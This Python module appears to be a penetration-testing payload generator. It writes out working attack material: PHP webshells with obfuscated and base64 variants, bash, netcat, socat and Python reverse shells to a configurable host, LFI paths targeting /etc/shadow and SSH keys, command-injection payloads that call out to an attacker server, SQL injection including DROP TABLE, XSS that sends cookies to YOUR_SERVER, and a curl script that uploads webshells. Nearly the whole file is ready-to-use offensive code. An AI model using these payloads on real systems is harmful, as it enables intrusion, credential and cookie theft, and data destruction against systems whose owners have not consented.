"""
Script Generator module - generates payloads and scripts for common attack vectors
"""
import os
from datetime import datetime


SCRIPTS = {
    "file_upload_bypass": {
        "description": "Genera variantes de extensiones para bypass de file upload",
        "category": "File Upload"
    },
    "php_webshell": {
        "description": "Webshell PHP mínima con parámetro cmd",
        "category": "Webshell"
    },
    "lfi_payloads": {
        "description": "Lista de payloads para Local File Inclusion",
        "category": "LFI"
    },
    "rce_test_payloads": {
        "description": "Payloads básicos de RCE para testing",
        "category": "RCE"
    },
    "reverse_shell_bash": {
        "description": "Reverse shell en Bash",
        "category": "Reverse Shell"
    },
    "reverse_shell_python": {
        "description": "Reverse shell en Python3",
        "category": "Reverse Shell"
    },
    "sqli_payloads": {
        "description": "Payloads básicos de SQL Injection",
        "category": "SQLi"
    },
    "xss_payloads": {
        "description": "Payloads de XSS (reflected y stored)",
        "category": "XSS"
    },
    "ffuf_vhost": {
        "description": "Comando ffuf para Virtual Host enumeration",
        "category": "Recon"
    },
    "curl_upload_test": {
        "description": "Script curl para testear file upload endpoints",
        "category": "File Upload"
    },
}


def generate_file_upload_bypass(options: dict) -> str:
    filename = options.get("filename", "shell")
    content = f"""# ============================================
# FILE UPLOAD BYPASS PAYLOADS
# Base filename: {filename}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

# --- PHP variants ---
{filename}.php
{filename}.php3
{filename}.php4
{filename}.php5
{filename}.php7
{filename}.phtml
{filename}.pHp
{filename}.PhP
{filename}.PHP
{filename}.pHp5
{filename}.shtml

# --- Double extension (some servers parse first ext) ---
{filename}.php.jpg
{filename}.php.png
{filename}.php.gif
{filename}.jpg.php
{filename}.png.php

# --- Null byte injection (legacy) ---
{filename}.php%00.jpg
{filename}.php\\x00.jpg

# --- MIME bypass candidates ---
# Upload with Content-Type: image/jpeg but .php extension
# Use Burp Suite to intercept and change MIME type

# --- JSP / ASP variants ---
{filename}.jsp
{filename}.jspx
{filename}.asp
{filename}.aspx
{filename}.cer
{filename}.asa

# --- Config bypass ---
.htaccess  (content: AddType application/x-httpd-php .jpg)
.user.ini  (content: auto_prepend_file=shell.jpg)

# --- Test curl command ---
curl -X POST http://TARGET/upload \\
  -F "file=@{filename}.php;type=image/jpeg" \\
  -b "session=YOUR_SESSION_COOKIE"
"""
    return content


def generate_php_webshell(options: dict) -> str:
    param = options.get("param", "cmd")
    content = f"""<?php
// Minimal PHP webshell - for authorized testing only
// Usage: http://target/shell.php?{param}=id

if(isset($_REQUEST['{param}'])){{
    $cmd = $_REQUEST['{param}'];
    echo '<pre>';
    system($cmd);
    echo '</pre>';
}}
?>

/* --- Obfuscated variant (bypass simple filters) --- */
<?php $c=$_REQUEST['{param}'];if($c){{$f='sys'.'tem';$f($c);}} ?>

/* --- Base64 encoded variant --- */
<?php eval(base64_decode('aWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpe3N5c3RlbSgkX1JFUVVFU1RbJ2NtZCddKTt9')); ?>
"""
    return content


def generate_lfi_payloads(options: dict) -> str:
    content = f"""# ============================================
# LFI PAYLOADS
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# Usage: append to parameter, e.g. ?page=PAYLOAD
# ============================================

# --- Basic ---
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/version

# --- Path traversal ---
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# --- Encoded ---
..%2Fetc%2Fpasswd
..%252Fetc%252Fpasswd
..%c0%afetc%c0%afpasswd
%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/etc/passwd

# --- Null byte (legacy PHP) ---
../etc/passwd%00
../etc/passwd\\x00
../etc/passwd%00.jpg

# --- PHP wrappers ---
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://input  (POST body: <?php system('id'); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id
file:///etc/passwd

# --- Windows paths ---
C:\\Windows\\System32\\drivers\\etc\\hosts
C:/Windows/win.ini
C:/boot.ini
..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts

# --- Interesting Linux files ---
/var/log/apache2/access.log  (Log poisoning)
/var/log/nginx/access.log
/proc/self/fd/0
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/root/.bash_history
/root/.ssh/id_rsa
"""
    return content


def generate_rce_payloads(options: dict) -> str:
    content = f"""# ============================================
# RCE TEST PAYLOADS
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

# --- Basic command injection ---
; id
| id
&& id
& id
|| id
` id`
$(id)
${{7*7}}

# --- Blind RCE (time-based) ---
; sleep 5
| sleep 5
&& sleep 5
; ping -c 5 127.0.0.1

# --- Blind RCE (OOB - out of band) ---
; curl http://YOUR_BURP_COLLABORATOR/$(id)
; wget http://YOUR_SERVER/$(whoami)
; nslookup $(id).YOUR_DOMAIN

# --- Filter bypass ---
; c''at /etc/passwd
; ca${{IFS}}t /etc/passwd
; {{'cat','/etc/passwd'}}
; /???/??t /etc/passwd  (glob)

# --- SSTI (Server Side Template Injection) ---
${{7*7}}        -> 49 (Jinja2/Twig)
<%= 7*7 %>     -> 49 (ERB)
#{{7*7}}        -> 49 (Ruby)
${{T(java.lang.Runtime).getRuntime().exec('id')}}  (Spring)
"""
    return content


def generate_reverse_shell_bash(options: dict) -> str:
    lhost = options.get("lhost", "YOUR_IP")
    lport = options.get("lport", "4444")
    content = f"""# ============================================
# REVERSE SHELL - BASH
# LHOST: {lhost} | LPORT: {lport}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

# --- Listener (run first on your machine) ---
nc -lvnp {lport}

# --- Bash ---
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1

# --- Bash encoded ---
bash -c '{{bash,-i}}>{{/dev/tcp/{lhost}/{lport}}}0>&1'

# --- URL encoded (for injection in URLs) ---
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{lhost}%2F{lport}%200%3E%261

# --- sh variant ---
sh -i >& /dev/tcp/{lhost}/{lport} 0>&1

# --- Netcat ---
nc -e /bin/bash {lhost} {lport}
nc -e /bin/sh {lhost} {lport}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f

# --- Socat ---
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}

# --- Upgrade shell after getting connection ---
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Then Ctrl+Z
stty raw -echo; fg
"""
    return content


def generate_reverse_shell_python(options: dict) -> str:
    lhost = options.get("lhost", "YOUR_IP")
    lport = options.get("lport", "4444")
    content = f"""# ============================================
# REVERSE SHELL - PYTHON3
# LHOST: {lhost} | LPORT: {lport}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

# --- Listener ---
nc -lvnp {lport}

# --- Python3 one-liner ---
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# --- Python3 script ---
import socket
import subprocess
import os

HOST = "{lhost}"
PORT = {lport}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
"""
    return content


def generate_sqli_payloads(options: dict) -> str:
    content = f"""# ============================================
# SQL INJECTION PAYLOADS
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

# --- Authentication bypass ---
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' OR 'x'='x
') OR ('1'='1
1' OR '1'='1

# --- Union-based (detect columns first) ---
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  <- error here means 2 columns
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT table_name,NULL FROM information_schema.tables--

# --- Error-based (MySQL) ---
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--

# --- Blind (boolean-based) ---
' AND 1=1--   <- true, normal response
' AND 1=2--   <- false, different response
' AND SUBSTRING(version(),1,1)='5'--

# --- Time-based blind ---
'; SLEEP(5)--               (MySQL)
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
'; SELECT pg_sleep(5)--     (PostgreSQL)

# --- Stacked queries ---
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacked','hacked')--
"""
    return content


def generate_xss_payloads(options: dict) -> str:
    content = f"""# ============================================
# XSS PAYLOADS
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

# --- Basic reflected ---
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

# --- Filter bypass ---
<ScRiPt>alert(1)</sCrIpT>
<script>alert`1`</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="x" onerror="alert(1)">
<svg><script>alert(1)</script></svg>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>

# --- Cookie theft ---
<script>document.location='http://YOUR_SERVER/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://YOUR_SERVER/steal?c='+btoa(document.cookie))">

# --- DOM-based ---
# Inject into URL hash: #<img src=x onerror=alert(1)>
# Inject into URL param if reflected in DOM without encoding

# --- Stored XSS test ---
<script>fetch('http://YOUR_SERVER/'+document.cookie)</script>
"""
    return content


def generate_ffuf_vhost(options: dict) -> str:
    target = options.get("target", "TARGET_IP")
    domain = options.get("domain", "example.com")
    content = f"""# ============================================
# VIRTUAL HOST ENUMERATION - FFUF
# Target: {target} | Domain: {domain}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

# --- Command ---
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
     -u http://{target}/ \\
     -H "Host: FUZZ.{domain}" \\
     -fc 301,302,404 \\
     -t 50 \\
     -c

# --- DNS subdomain brute force ---
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
     -u http://FUZZ.{domain}/ \\
     -t 50 \\
     -c

# --- With size filter (adjust after first run) ---
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
     -u http://{target}/ \\
     -H "Host: FUZZ.{domain}" \\
     -fs 1234 \\
     -t 50
"""
    return content


def generate_curl_upload_test(options: dict) -> str:
    target = options.get("target", "http://TARGET/upload")
    content = f"""#!/bin/bash
# ============================================
# FILE UPLOAD TEST SCRIPT - CURL
# Target: {target}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# ============================================

TARGET="{target}"

# Create test files
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.phtml
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php5
cp /tmp/shell.php /tmp/shell.jpg

echo "[*] Testing PHP extension..."
curl -s -X POST $TARGET \\
  -F "file=@/tmp/shell.php" \\
  -w "\\nHTTP Status: %{{http_code}}\\n"

echo ""
echo "[*] Testing PHP with image MIME type..."
curl -s -X POST $TARGET \\
  -F "file=@/tmp/shell.php;type=image/jpeg" \\
  -w "\\nHTTP Status: %{{http_code}}\\n"

echo ""
echo "[*] Testing .phtml extension..."
curl -s -X POST $TARGET \\
  -F "file=@/tmp/shell.phtml" \\
  -w "\\nHTTP Status: %{{http_code}}\\n"

echo ""
echo "[*] Testing double extension..."
curl -s -X POST $TARGET \\
  -F "file=@/tmp/shell.php.jpg" \\
  -w "\\nHTTP Status: %{{http_code}}\\n"

echo ""
echo "[+] Done. Check response bodies for upload paths."
"""
    return content


GENERATORS = {
    "file_upload_bypass": generate_file_upload_bypass,
    "php_webshell": generate_php_webshell,
    "lfi_payloads": generate_lfi_payloads,
    "rce_test_payloads": generate_rce_payloads,
    "reverse_shell_bash": generate_reverse_shell_bash,
    "reverse_shell_python": generate_reverse_shell_python,
    "sqli_payloads": generate_sqli_payloads,
    "xss_payloads": generate_xss_payloads,
    "ffuf_vhost": generate_ffuf_vhost,
    "curl_upload_test": generate_curl_upload_test,
}


def generate_script(script_name: str, options: dict) -> str:
    if script_name in GENERATORS:
        return GENERATORS[script_name](options)
    return f"# Script '{script_name}' not found"


def save_script(script_name: str, content: str) -> str:
    os.makedirs("scripts", exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = ".sh" if "curl" in script_name or "shell" in script_name else ".txt"
    filename = f"scripts/{script_name}_{ts}{ext}"
    with open(filename, "w") as f:
        f.write(content)
    if ext == ".sh":
        os.chmod(filename, 0o755)
    return filename
